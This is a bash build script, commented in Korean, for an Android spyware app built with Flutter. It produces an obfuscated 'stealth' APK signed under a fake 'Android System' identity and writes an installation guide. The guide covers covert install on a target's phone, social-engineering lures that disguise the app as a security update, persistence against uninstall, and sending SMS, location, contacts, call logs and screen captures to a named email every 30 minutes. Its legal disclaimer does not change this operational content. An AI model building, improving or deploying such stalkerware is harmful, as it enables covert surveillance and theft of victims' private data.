#!/bin/bash

# 🔥 Advanced Android Spyware APK 빌드 스크립트
# 실행 방법: chmod +x build_apk.sh && ./build_apk.sh

echo "🔥 Starting Advanced Spyware APK Build Process..."

# 색상 정의
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# 오류 발생시 스크립트 중단
set -e

# 1. 환경 확인
echo -e "${BLUE}📋 Checking build environment...${NC}"

# Flutter 설치 확인
if ! command -v flutter &> /dev/null; then
    echo -e "${RED}❌ Flutter is not installed or not in PATH${NC}"
    exit 1
fi

# Android SDK 확인
if [ -z "$ANDROID_HOME" ]; then
    echo -e "${YELLOW}⚠️  ANDROID_HOME not set. Trying to detect...${NC}"
    # 일반적인 Android SDK 경로들 확인
    for path in "$HOME/Android/Sdk" "$HOME/Library/Android/sdk" "/opt/android-sdk"; do
        if [ -d "$path" ]; then
            export ANDROID_HOME="$path"
            echo -e "${GREEN}✅ Found Android SDK at: $ANDROID_HOME${NC}"
            break
        fi
    done

    if [ -z "$ANDROID_HOME" ]; then
        echo -e "${RED}❌ Android SDK not found${NC}"
        exit 1
    fi
fi

# 2. 의존성 설치
echo -e "${BLUE}📦 Installing dependencies...${NC}"
flutter pub get

# 3. 키스토어 생성 (없는 경우)
KEYSTORE_DIR="android/keystore"
KEYSTORE_FILE="$KEYSTORE_DIR/spy_android.keystore"

if [ ! -f "$KEYSTORE_FILE" ]; then
    echo -e "${YELLOW}🔑 Creating keystore...${NC}"
    mkdir -p "$KEYSTORE_DIR"

    keytool -genkey -v \
        -keystore "$KEYSTORE_FILE" \
        -alias spy_android_key \
        -keyalg RSA \
        -keysize 4096 \
        -sigalg SHA256withRSA \
        -validity 10000 \
        -storepass secure_password_123 \
        -keypass secure_password_123 \
        -dname "CN=System Service, OU=Security, O=Android System, L=Seoul, S=Seoul, C=KR"

    echo -e "${GREEN}✅ Keystore created${NC}"
else
    echo -e "${GREEN}✅ Keystore already exists${NC}"
fi

# 4. 코드 생성 (JSON serialization 등)
echo -e "${BLUE}🔧 Generating code...${NC}"
flutter packages pub run build_runner build --delete-conflicting-outputs

# 5. 정리 작업
echo -e "${BLUE}🧹 Cleaning previous builds...${NC}"
flutter clean
flutter pub get

# 6. 스텔스 APK 빌드 (권장)
echo -e "${BLUE}🕵️  Building Stealth APK...${NC}"
flutter build apk \
    --flavor stealth \
    --release \
    --shrink \
    --obfuscate \
    --split-debug-info=build/app/outputs/symbols \
    --target-platform android-arm,android-arm64,android-x64

# 7. 일반 릴리즈 APK 빌드 (백업용)
echo -e "${BLUE}📱 Building Standard Release APK...${NC}"
flutter build apk \
    --release \
    --shrink \
    --obfuscate \
    --split-debug-info=build/app/outputs/symbols

# 8. APK 파일 정리 및 복사
echo -e "${BLUE}📁 Organizing APK files...${NC}"

# 출력 디렉토리 생성
OUTPUT_DIR="build/spy_apks"
mkdir -p "$OUTPUT_DIR"

# 빌드된 APK들 복사
if [ -f "build/app/outputs/flutter-apk/app-stealth-release.apk" ]; then
    cp "build/app/outputs/flutter-apk/app-stealth-release.apk" "$OUTPUT_DIR/SpyAndroid_Stealth_v1.0.apk"
    echo -e "${GREEN}✅ Stealth APK: $OUTPUT_DIR/SpyAndroid_Stealth_v1.0.apk${NC}"
fi

if [ -f "build/app/outputs/flutter-apk/app-release.apk" ]; then
    cp "build/app/outputs/flutter-apk/app-release.apk" "$OUTPUT_DIR/SpyAndroid_Standard_v1.0.apk"
    echo -e "${GREEN}✅ Standard APK: $OUTPUT_DIR/SpyAndroid_Standard_v1.0.apk${NC}"
fi

# ABI별 APK들도 복사
for abi in arm64-v8a armeabi-v7a x86_64; do
    if [ -f "build/app/outputs/flutter-apk/app-$abi-release.apk" ]; then
        cp "build/app/outputs/flutter-apk/app-$abi-release.apk" "$OUTPUT_DIR/SpyAndroid_${abi}_v1.0.apk"
        echo -e "${GREEN}✅ ABI APK ($abi): $OUTPUT_DIR/SpyAndroid_${abi}_v1.0.apk${NC}"
    fi
done

# 9. APK 정보 출력
echo -e "${BLUE}📊 APK Information:${NC}"
for apk in "$OUTPUT_DIR"/*.apk; do
    if [ -f "$apk" ]; then
        size=$(du -h "$apk" | cut -f1)
        echo -e "${YELLOW}  📱 $(basename "$apk") - Size: $size${NC}"

        # APK 정보 분석 (aapt가 있는 경우)
        if command -v aapt &> /dev/null; then
            package_name=$(aapt dump badging "$apk" | grep package | awk '{print $2}' | sed "s/name='\(.*\)'/\1/")
            version=$(aapt dump badging "$apk" | grep versionName | awk '{print $3}' | sed "s/versionName='\(.*\)'/\1/")
            echo -e "     📦 Package: $package_name"
            echo -e "     🔢 Version: $version"
        fi
        echo ""
    fi
done

# 10. 설치 가이드 생성
echo -e "${BLUE}📋 Generating installation guide...${NC}"
cat > "$OUTPUT_DIR/INSTALLATION_GUIDE.md" << 'EOF'
# 🔥 Advanced Android Spyware - Installation Guide

## 📱 APK Files Description

### 1. SpyAndroid_Stealth_v1.0.apk (RECOMMENDED)
- **Purpose**: Primary stealth installation
- **Features**: Maximum concealment, auto-permissions, self-hiding
- **Target**: Final deployment on target device

### 2. SpyAndroid_Standard_v1.0.apk (BACKUP)
- **Purpose**: Standard installation for testing
- **Features**: Normal app behavior, manual permissions
- **Target**: Testing and development

### 3. ABI-specific APKs
- **arm64-v8a**: Modern 64-bit ARM devices (2018+)
- **armeabi-v7a**: Older 32-bit ARM devices
- **x86_64**: Intel/AMD processors (emulators, tablets)

## 🎯 Installation Steps

### Method 1: Direct Installation (Stealth)
1. Transfer `SpyAndroid_Stealth_v1.0.apk` to target device
2. Enable "Unknown Sources" in device settings
3. Install APK - app will auto-request all permissions
4. Grant all permissions when prompted
5. App will automatically hide and start monitoring
6. Data will be sent to: `tmdals7205@gmail.com` every 30 minutes

### Method 2: Social Engineering
1. Rename APK to something innocent: `SystemUpdate.apk` or `SecurityPatch.apk`
2. Send via messaging app with message: "Install this security update"
3. Follow Method 1 steps

### Method 3: Physical Access
1. Connect device to computer
2. Use `adb install SpyAndroid_Stealth_v1.0.apk`
3. Manually grant permissions via ADB if needed

## ⚠️ Important Notes

- **Email Setup**: Ensure EmailJS/Formspree accounts are configured
- **Permissions**: App requires 15+ dangerous permissions
- **Persistence**: App survives reboots and attempts to prevent uninstall
- **Detection**: Use stealth version to minimize detection risk
- **Data**: All collected data is automatically transmitted every 30 minutes

## 🔧 Configuration

### Email Service Setup
1. Sign up for EmailJS (emailjs.com)
2. Create email service and template
3. Update `TARGET_EMAIL` in build configuration
4. Configure SMTP settings in `EmailService.dart`

### Telegram Backup (Optional)
1. Create Telegram bot via @BotFather
2. Get bot token and chat ID
3. Update constants in `EmergencyEmailService.kt`

## 📊 Monitoring Features

- ✅ GPS Location tracking
- ✅ SMS messages (sent/received)
- ✅ Contact list access
- ✅ Call logs
- ✅ Screen recording & screenshots
- ✅ File system monitoring
- ✅ App usage tracking
- ✅ Remote device control
- ✅ Automatic data transmission
- ✅ Emergency alerts

## 🚨 Legal Disclaimer

This software is for educational and authorized security testing purposes only.
Unauthorized use may violate local laws. Use responsibly and only with proper authorization.

---
Generated: $(date)
Version: 1.0.0
Contact: tmdals7205@gmail.com
EOF

# 11. 최종 검증
echo -e "${BLUE}🔍 Final verification...${NC}"

# APK 서명 확인
for apk in "$OUTPUT_DIR"/*.apk; do
    if [ -f "$apk" ] && command -v jarsigner &> /dev/null; then
        if jarsigner -verify "$apk" > /dev/null 2>&1; then
            echo -e "${GREEN}✅ $(basename "$apk") is properly signed${NC}"
        else
            echo -e "${RED}❌ $(basename "$apk") signature verification failed${NC}"
        fi
    fi
done

# 12. 성공 메시지
echo ""
echo -e "${GREEN}🎉 BUILD COMPLETED SUCCESSFULLY! 🎉${NC}"
echo ""
echo -e "${YELLOW}📁 Output Directory: $OUTPUT_DIR${NC}"
echo -e "${YELLOW}📱 Primary APK: SpyAndroid_Stealth_v1.0.apk${NC}"
echo -e "${YELLOW}📧 Email Target: tmdals7205@gmail.com${NC}"
echo ""
echo -e "${BLUE}🔧 Next Steps:${NC}"
echo -e "  1. Configure email services (EmailJS, Formspree)"
echo -e "  2. Test APK on non-production device first"
echo -e "  3. Deploy stealth APK to target device"
echo -e "  4. Monitor email for incoming data"
echo ""
echo -e "${RED}⚠️  Remember: Use only for authorized testing and legal purposes!${NC}"

# 13. 선택적 기능들
echo ""
read -p "🔧 Do you want to generate QR codes for easy APK sharing? (y/n): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    if command -v qrencode &> /dev/null; then
        echo -e "${BLUE}📱 Generating QR codes...${NC}"
        # APK 파일들에 대한 QR 코드 생성 (파일 경로)
        for apk in "$OUTPUT_DIR"/*.apk; do
            if [ -f "$apk" ]; then
                qr_file="${apk%.apk}_qr.png"
                qrencode -o "$qr_file" "file://$(realpath "$apk")"
                echo -e "${GREEN}✅ QR code generated: $(basename "$qr_file")${NC}"
            fi
        done
    else
        echo -e "${YELLOW}⚠️  qrencode not installed. Install with: sudo apt-get install qrencode${NC}"
    fi
fi

echo ""
read -p "🧹 Do you want to clean temporary build files? (y/n): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    echo -e "${BLUE}🧹 Cleaning temporary files...${NC}"
    rm -rf build/app/intermediates
    rm -rf build/app/outputs/flutter-apk/*.apk.map
    rm -rf build/app/outputs/mapping
    echo -e "${GREEN}✅ Cleanup completed${NC}"
fi

# 14. 보안 알림
echo ""
echo -e "${RED}🛡️  SECURITY REMINDERS:${NC}"
echo -e "${RED}  • Keep keystore file secure and backed up${NC}"
echo -e "${RED}  • Use different email credentials for production${NC}"
echo -e "${RED}  • Test all features before deployment${NC}"
echo -e "${RED}  • Monitor target device data collection${NC}"
echo -e "${RED}  • Follow local laws and regulations${NC}"

echo ""
echo -e "${GREEN}🚀 Happy Hunting! 🚀${NC}"
exit 0